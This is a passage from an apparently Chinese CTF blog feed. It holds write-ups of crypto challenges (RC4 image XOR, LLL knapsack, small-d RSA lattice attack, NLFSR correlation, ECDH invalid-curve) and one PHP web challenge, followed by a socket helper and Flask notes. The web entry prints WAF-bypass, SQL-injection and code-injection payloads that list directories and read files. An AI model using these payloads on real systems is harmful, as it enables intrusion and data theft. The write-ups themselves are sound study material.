class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># author : zraxx</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> numpy <span class="keyword">import</span> array</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">Plaintext1 = <span class="string">"RC4IsInteresting"</span></span><br><span class="line"></span><br><span class="line">enc1_file = Image.open(<span class="string">r"enc1.png"</span>)</span><br><span class="line">enc2_file = Image.open(<span class="string">r"enc2.png"</span>)</span><br><span class="line">img1 = array(enc1_file)</span><br><span class="line">img2 = array(enc2_file)</span><br><span class="line">a, b, _ = img1.shape</span><br><span class="line">ciphertext1 = <span class="number">12078640933356268898100798377710191641</span></span><br><span class="line">m = ord(<span class="string">'g'</span>)</span><br><span class="line">c = int(hex(ciphertext1).strip(<span class="string">'L'</span>)[<span class="number">-2</span>:],<span class="number">16</span>)</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">0</span>, a):</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> range(<span class="number">0</span>, b):</span><br><span class="line">        pixel2 = img2[x, y]</span><br><span class="line">        pixel1 = img1[x, y]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">3</span>):</span><br><span class="line">            k = (c ^ m)</span><br><span class="line">            c = pixel2[i] <span class="comment"># get ciphertext of img2</span></span><br><span class="line">            pixel2[i] = pixel2[i] ^ k  </span><br><span class="line">            m = pixel2[i] <span class="comment"># get plaintext of img2 and img1</span></span><br><span class="line">            c = pixel1[i] <span class="comment"># get ciphertext of img1</span></span><br><span class="line">        img2[x][y] = pixel2</span><br><span class="line">enc = Image.fromarray(img2)</span><br><span class="line">enc.save(<span class="string">"flag.png"</span>)</span><br></pre></td></tr></table></figure><h2 id="backpacker"><a href="#backpacker" class="headerlink" title="backpacker"></a>backpacker</h2><p>这是一个利用LLL的攻击，比赛时还没有接触过这类题目，所以没有解出来。之后在网上搜索资料看到相关的攻击方法，记录一下。</p><p><img src="/2020/05/26/%E5%AE%89%E6%81%92%E4%BA%94%E6%9C%88%E8%B5%9BBJD&DAS/1591426710827.png" alt="theory"></p><p>按文中给出的方法构造矩阵，然后求LLL，对其中的行向量（只包含-1或1）进行处理（-1转为0），即得到了我们的明文。</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF - 密码学 - LLL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>De1CTF[2020]-easyRSA</title>
      <link href="/2020/05/11/De1CTF%5B2020%5D-easyRSA/"/>
      <url>/2020/05/11/De1CTF%5B2020%5D-easyRSA/</url>
      
        <content type="html"><![CDATA[<p>题目源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> FLAG <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">genE</span><span class="params">(lcm,limit)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        r = random.randint(limit,limit*<span class="number">0x1000000000001</span>)</span><br><span class="line">        d = gmpy2.next_prime(r)</span><br><span class="line">        e = gmpy2.invert(d,lcm)</span><br><span class="line">        <span class="keyword">if</span> isPrime(e):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> e</span><br><span class="line"></span><br><span class="line">p = getStrongPrime(<span class="number">1024</span>)</span><br><span class="line">q = getStrongPrime(<span class="number">1024</span>)</span><br><span class="line">n = p*q</span><br><span class="line">lcm = gmpy2.lcm(p<span class="number">-1</span>,q<span class="number">-1</span>)</span><br><span class="line">limit = gmpy2.iroot(n,<span class="number">3</span>)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">e1 = genE(lcm,limit)</span><br><span class="line">e2 = genE(lcm,limit)</span><br><span class="line"></span><br><span class="line">phi = (p<span class="number">-1</span>)*(q<span class="number">-1</span>)</span><br><span class="line">d1 = gmpy2.invert(e1,phi)</span><br><span class="line">d2 = gmpy2.invert(e2,phi)</span><br><span class="line"></span><br><span class="line">e = [e1,e2]</span><br><span class="line">plain = bytes_to_long(flag)</span><br><span class="line">cipher = pow(plain,e[random.getrandbits(<span class="number">1</span>)],n)</span><br><span class="line"></span><br><span class="line">print(<span class="string">'N:'</span> + str(n))</span><br><span class="line">print(<span class="string">'e1:'</span> + str(e1))</span><br><span class="line">print(<span class="string">'e2:'</span> + str(e2))</span><br><span class="line">print(<span class="string">'cipher:'</span> + str(cipher))</span><br></pre></td></tr></table></figure><p>用n计算了两对e，d，其中d都比较小</p><p>这里需要参考这篇论文<a href="https://link.springer.com/content/pdf/10.1007%2F3-540-46701-7_14.pdf" target="_blank" rel="noopener">https://link.springer.com/content/pdf/10.1007%2F3-540-46701-7_14.pdf</a> </p><p>论文的结论就是给出多对e,d，其中$d&lt;N^α$，就可以分解N</p><p>这里当给出2对e，d时需要满足$d&lt;N^{5/14}$，观察题目就可以发现满足该不等式。</p><p>因此我们构造矩阵</p><p>$B = \begin{bmatrix}1 &amp; -N &amp; 0 &amp; N^2 \\  &amp; e_1 &amp; - e_1 &amp; -e_1N\\ &amp; &amp; e_2 &amp; -e_2N \\ &amp; &amp; &amp; e_1e_2\end{bmatrix}$</p><p>$D = \begin{bmatrix}N &amp;  &amp;  &amp;  \\  &amp;  N^{(1/2)} &amp; &amp; \\ &amp; &amp; N^{1+\delta_2} &amp;  \\ &amp; &amp; &amp; 1\end{bmatrix}$</p><p>$L=B*D$</p><p>同时需要求解的向量$v = (k_1k_2,k_2(g-k_1s),g(k_1-k_2),(g-k_1s)(g-k_2s))$</p><p>之后对$L$求$LLL$，记为$L_2$</p><p>于是$v = L_2[0]*L^{-1}$</p><p>之后便可得到$\Phi(N)=e_1*v[1]/v[0]​$，进而求得明文</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> 密码学 </tag>
            
            <tag> RSA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>De1CTF[2020]-NLFSR</title>
      <link href="/2020/05/11/De1CTF%5B2020%5D-NLFSR/"/>
      <url>/2020/05/11/De1CTF%5B2020%5D-NLFSR/</url>
      
        <content type="html"><![CDATA[<p>首先看一下题目源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> a, b, c, d, flag</span><br><span class="line"><span class="keyword">assert</span> flag == <span class="string">"De1CTF&#123;"</span> + <span class="string">''</span>.join([hex(i)[<span class="number">2</span>:] <span class="keyword">for</span> i <span class="keyword">in</span> [a, b, c, d]]) + <span class="string">"&#125;"</span></span><br><span class="line"><span class="keyword">assert</span> [len(bin(i)[<span class="number">2</span>:]) <span class="keyword">for</span> i <span class="keyword">in</span> [a, b, c, d]] == [<span class="number">19</span>, <span class="number">19</span>, <span class="number">13</span>, <span class="number">6</span>]</span><br><span class="line"></span><br><span class="line">ma, mb, mc, md = <span class="number">0x505a1</span>, <span class="number">0x40f3f</span>, <span class="number">0x1f02</span>, <span class="number">0x31</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lfsr</span><span class="params">(r, m)</span>:</span> <span class="keyword">return</span> ((r &lt;&lt; <span class="number">1</span>) &amp; <span class="number">0xffffff</span>) ^ (bin(r &amp; m).count(<span class="string">'1'</span>) % <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">combine</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> a, b, c, d</span><br><span class="line">    a = lfsr(a, ma)</span><br><span class="line">    b = lfsr(b, mb)</span><br><span class="line">    c = lfsr(c, mc)</span><br><span class="line">    d = lfsr(d, md)</span><br><span class="line">    [ao, bo, co, do] = [i &amp; <span class="number">1</span> <span class="keyword">for</span> i <span class="keyword">in</span> [a, b, c, d]]</span><br><span class="line">    <span class="keyword">return</span> (ao*bo) ^ (bo*co) ^ (bo*do) ^ co ^ do</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">genkey</span><span class="params">(nb)</span>:</span></span><br><span class="line">    s = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(nb*<span class="number">8</span>):</span><br><span class="line">        s += str(combine())</span><br><span class="line">    open(<span class="string">"data"</span>, <span class="string">"w+"</span>).write(s)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">genkey(<span class="number">128</span>*<span class="number">1024</span>)</span><br></pre></td></tr></table></figure><p>可以看出这个属于非线性组合生成器 </p><p>可以参考<a href="https://ctf-wiki.github.io/ctf-wiki/crypto/streamcipher/fsr/nfsr-zh/" target="_blank" rel="noopener">CTF-WIKI</a>关于相关攻击的介绍</p><p>回到本题目中，我们可以用脚本测试一下有哪些相关性，这里我们可以观察到有三组相关性</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">suma = <span class="number">0</span></span><br><span class="line">sumb = <span class="number">0</span></span><br><span class="line">sumc = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> ao <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line"><span class="keyword">for</span> bo <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line"><span class="keyword">for</span> co <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line"><span class="keyword">for</span> do <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line">o = (ao*bo) ^ (bo*co) ^ (bo*do) ^ co ^ do</span><br><span class="line">suma += ao==o</span><br><span class="line">sumb += (<span class="number">1</span>-(ao^bo))==o</span><br><span class="line">sumc += (co^do)==o</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> suma*<span class="number">1.0</span>/<span class="number">16</span></span><br><span class="line"><span class="keyword">print</span> sumb*<span class="number">1.0</span>/<span class="number">16</span></span><br><span class="line"><span class="keyword">print</span> sumc*<span class="number">1.0</span>/<span class="number">16</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">0.75</span></span><br><span class="line"><span class="string">0.75</span></span><br><span class="line"><span class="string">0.75</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure><p>因此我们可以首先恢复出a，然后根据a恢复出b，同时c，d也能直接恢复</p>]]></content>
      
      
      
        <tags>
            
            <tag> 密码学 </tag>
            
            <tag> LFSR </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>De1CTF[2020]-ECDH</title>
      <link href="/2020/05/11/De1CTF%5B2020%5D-ECDH/"/>
      <url>/2020/05/11/De1CTF%5B2020%5D-ECDH/</url>
      
        <content type="html"><![CDATA[<p>定位到题目源码中最关键的部分——密钥交换</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mul</span><span class="params">(n,p)</span>:</span></span><br><span class="line">r = zero</span><br><span class="line">tmp = p</span><br><span class="line"><span class="keyword">while</span> <span class="number">0</span> &lt; n:</span><br><span class="line">    <span class="keyword">if</span> n &amp; <span class="number">1</span> == <span class="number">1</span>:</span><br><span class="line">        r = add(r,tmp)</span><br><span class="line">    n, tmp = n &gt;&gt; <span class="number">1</span>, add(tmp,tmp)</span><br><span class="line"><span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exchange</span><span class="params">(self)</span>:</span></span><br><span class="line">self.dosend(<span class="string">"Give me your key:\n"</span>) </span><br><span class="line">self.dosend(<span class="string">"X:\n"</span>) </span><br><span class="line">x = int(self.recvall(<span class="number">80</span>))</span><br><span class="line">self.dosend(<span class="string">"Y:\n"</span>) </span><br><span class="line">y = int(self.recvall(<span class="number">80</span>))</span><br><span class="line">key = (x,y)</span><br><span class="line">result = mul(self.secret,key)</span><br><span class="line">self.key = self.pointToKeys(result)</span><br><span class="line">self.dosend(<span class="string">"Exchange success\n"</span>)</span><br></pre></td></tr></table></figure><p>攻击点：<strong>没有验证我们发送的key是否在曲线上</strong></p><p>原理：针对椭圆曲线的点加以及倍点运算中，结果与b是无关的，因此我们可以构造曲线$E_i:y^2=x^3+ax+b_i$，其中$order(E_i)$含有小素数因子$p_i$，于是我们可以发送点$P*(order(E_i)/p_i)$，而在密钥交换后我们h很快的计算出对方的$secretkey\mod p_i$的值，记为$c_i$，在经过多次反复密钥交换后，可利用CRT还原出secret key。</p><p>具体代码可参考<a href="https://ctftime.org/writeup/14469" target="_blank" rel="noopener">https://ctftime.org/writeup/14469</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> 密码学 </tag>
            
            <tag> ECDH </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RoarCTF[2019]-Easy Calc</title>
      <link href="/2020/05/07/RoarCTF%5B2019%5D-Easy%20Calc/"/>
      <url>/2020/05/07/RoarCTF%5B2019%5D-Easy%20Calc/</url>
      
        <content type="html"><![CDATA[<p>知识点：<strong>PHP的字符串解析特性</strong></p><p>参考文章：<a href="https://www.freebuf.com/column/207936.html" target="_blank" rel="noopener">https://www.freebuf.com/column/207936.html</a> </p><p>PHP会将URL或body中的查询字符串关联到<code>$_GET</code>或<code>$_POST</code>。例如：<code>/?foo=bar</code>代表<code>Array([foo] =&gt; &quot;bar&quot;)</code>。值得注意的是，查询字符串在解析的过程中会将某些字符删除或用下划线代替。例如，<code>/?%20news[id%00=42</code>会转换为<code>Array([news_id] =&gt; 42)</code>。如果一个IDS/IPS或WAF中有一条规则是当<code>news_id</code>参数的值是一个非数字的值则拦截，那么我们就可以用以下语句绕过： </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;news.php?%20news[id%00&#x3D;42&quot;+AND+1&#x3D;0--</span><br></pre></td></tr></table></figure><p>上述PHP语句的参数<code>%20news[id%00</code>的值将存储到$_GET[“news_id”]中。 </p><p>有了这个知识，我们就可以绕过waf了。</p><p>同时，我们需要了解几个php的函数</p><ul><li>scandir($dir) , 列出dir下的所有文件和目录，默认升序，如要降序，则用scandir($dir, 1)</li><li>file_get_contents($file)，获取file的内容</li><li>var_dump($var)，输出变量的相关信息 </li></ul><p>ok，然后就是实操</p><p>第一步，获取目录下的所有文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?%20num&#x3D;1;var_dump(scandir(chr(47)))</span><br></pre></td></tr></table></figure><p>找到文件flagg</p><p>第二步，获取文件内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?%20num&#x3D;1;var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</span><br></pre></td></tr></table></figure><p>成功拿到flag</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WEB </tag>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python2基于socket.socket类实现类似pwntools的交互方法</title>
      <link href="/2020/05/06/python2%E5%9F%BA%E4%BA%8Esocket.socket%E7%B1%BB%E5%AE%9E%E7%8E%B0%E7%B1%BB%E4%BC%BCpwntools%E7%9A%84%E4%BA%A4%E4%BA%92%E6%96%B9%E6%B3%95/"/>
      <url>/2020/05/06/python2%E5%9F%BA%E4%BA%8Esocket.socket%E7%B1%BB%E5%AE%9E%E7%8E%B0%E7%B1%BB%E4%BC%BCpwntools%E7%9A%84%E4%BA%A4%E4%BA%92%E6%96%B9%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<p>作为一名密码学选手，经常要用到python中的socket库来进行交互。然而，用过pwntools的都知道，它实现的交互方法比socket要友好的多了，类似sendline，sendafter方法等。</p><p>由于我的电脑是window系统，没能成功装上pwntools库，因此要用pwntools就需要开虚拟机，本人比较懒，就自己重新基于socket.socket类重新写了一个类，以实现类似pwntools中的交互方法。</p><p>具体代码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">'127.0.0.1'</span></span><br><span class="line">PORT = <span class="number">12233</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Mysocket</span><span class="params">()</span>:</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, myhost, myport)</span>:</span></span><br><span class="line">self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">self.client.connect((myhost, myport))</span><br><span class="line">self.fd = self.client.makefile(<span class="string">'rw'</span>, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">recvuntil</span><span class="params">(self, delim = <span class="string">"\n"</span>)</span>:</span></span><br><span class="line">buf = <span class="string">''</span></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">not</span> buf.endswith(delim):</span><br><span class="line">buf += self.fd.read(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">return</span> buf.strip()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send</span><span class="params">(self, data)</span>:</span></span><br><span class="line">self.fd.write(data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sendline</span><span class="params">(self, data)</span>:</span></span><br><span class="line">self.fd.write(data + <span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sendlineafter</span><span class="params">(self, data, delim = <span class="string">"\n"</span>, debug = False)</span>:</span></span><br><span class="line">buf = self.recvuntil(delim)</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line"><span class="keyword">print</span> buf.strip()</span><br><span class="line">self.fd.write(data + <span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">close</span><span class="params">(self)</span>:</span></span><br><span class="line">self.client.close()</span><br><span class="line"></span><br><span class="line">p = Mysocket(HOST, PORT)</span><br><span class="line">p.close()</span><br></pre></td></tr></table></figure><p>后续将根据实际情况继续扩展</p>]]></content>
      
      
      
        <tags>
            
            <tag> socket </tag>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Flask框架学习1</title>
      <link href="/2020/05/05/Flask%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A01/"/>
      <url>/2020/05/05/Flask%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A01/</url>
      
        <content type="html"><![CDATA[<h3 id="Flask-HTTP方法"><a href="#Flask-HTTP方法" class="headerlink" title="Flask HTTP方法"></a>Flask HTTP方法</h3><p>默认情况下，Flask路由响应<strong>GET</strong>请求。但是，可以通过为<strong>route()</strong>装饰器提供方法参数来更改此首选项 </p><p>如下所示</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route('/login',methods = ['POST', 'GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">()</span>:</span></span><br><span class="line">   <span class="keyword">if</span> request.method == <span class="string">'POST'</span>:</span><br><span class="line">      user = request.form[<span class="string">'nm'</span>]</span><br><span class="line">      <span class="keyword">return</span> redirect(url_for(<span class="string">'success'</span>,name = user))</span><br><span class="line">   <span class="keyword">else</span>:</span><br><span class="line">      user = request.args.get(<span class="string">'nm'</span>)</span><br><span class="line">      <span class="keyword">return</span> redirect(url_for(<span class="string">'success'</span>,name = user))</span><br></pre></td></tr></table></figure><h3 id="Flask-模板"><a href="#Flask-模板" class="headerlink" title="Flask 模板"></a>Flask 模板</h3><p>可以以HTML的形式返回绑定到某个URL的函数的输出</p><p>相关函数: <strong>render_template()</strong></p><p>Flask将尝试在templates文件夹中找到HTML文件，而templates文件夹与脚本处于同级目录。 </p><p>术语<strong>‘web templating system（web模板系统）’</strong>指的是设计一个HTML脚本，其中可以动态插入变量数据。web模板系统包括模板引擎，某种数据源和模板处理器。 </p><p>例如，以下为hello.html中的内容</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!doctype <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hello &#123;&#123; name &#125;&#125;!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br></pre></td></tr></table></figure><p>而我们的python脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route('/hello/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello_name</span><span class="params">(user)</span>:</span></span><br><span class="line">   <span class="keyword">return</span> render_template(<span class="string">'hello.html'</span>, name = user)</span><br></pre></td></tr></table></figure><p>那么当我们输入URL- <a href="http://localhost:5000/hello/aaa" target="_blank" rel="noopener">http://localhost:5000/hello/aaa</a> 后，浏览器将显示”Hello aaa”</p><p><strong>Jinja2</strong>模板引擎使用以下分隔符从HTML转义。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">- &#123;% ... %&#125;用于语句</span><br><span class="line">- &#123;&#123; ... &#125;&#125;用于表达式可以打印到模板输出</span><br><span class="line">- &#123;# ... #&#125;用于未包含在模板输出中的注释</span><br><span class="line">- \# ... ##用于行语句</span><br></pre></td></tr></table></figure><p>举例：</p><p>html模板脚本</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!doctype <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  &#123;% if marks&gt;50 %&#125;</span><br><span class="line">  <span class="tag">&lt;<span class="name">h1</span>&gt;</span> Your result is pass!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">  &#123;% else %&#125;</span><br><span class="line">  <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Your result is fail<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">  &#123;% endif %&#125;</span><br></pre></td></tr></table></figure><p>python脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route('/hello/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello_name</span><span class="params">(score)</span>:</span></span><br><span class="line">   <span class="keyword">return</span> render_template(<span class="string">'hello.html'</span>, marks = score)</span><br></pre></td></tr></table></figure><h3 id="Flask-静态文件"><a href="#Flask-静态文件" class="headerlink" title="Flask 静态文件"></a>Flask 静态文件</h3><p>Web应用程序通常需要静态文件，例如<strong>javascript</strong>文件或支持网页显示的<strong>CSS</strong>文件。通常，配置Web服务器并为您提供这些服务，但在开发过程中，这些文件是从您的包或模块旁边的<em>static</em>文件夹中提供，它将在应用程序的<strong>/static</strong>中提供（static文件夹与python代码位于同一目录下）。 </p><p>在下面的示例中，在<strong>index.html</strong>中的HTML按钮的<strong>OnClick</strong>事件上调用<strong>hello.js</strong>中定义的<strong>javascript</strong>函数，该函数在Flask应用程序的<strong>“/”</strong>URL上呈现。 </p><p>python</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route("/")</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">   <span class="keyword">return</span> render_template(<span class="string">"index.html"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">   app.run(debug = <span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>index.html</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line">   <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span> = <span class="string">"text/javascript"</span> </span></span><br><span class="line"><span class="tag">         <span class="attr">src</span> = <span class="string">"&#123;&#123; url_for('static', filename = 'hello.js') &#125;&#125;"</span> &gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">   </span><br><span class="line">   <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span> = <span class="string">"button"</span> <span class="attr">onclick</span> = <span class="string">"sayHello()"</span> <span class="attr">value</span> = <span class="string">"Say Hello"</span> /&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line">   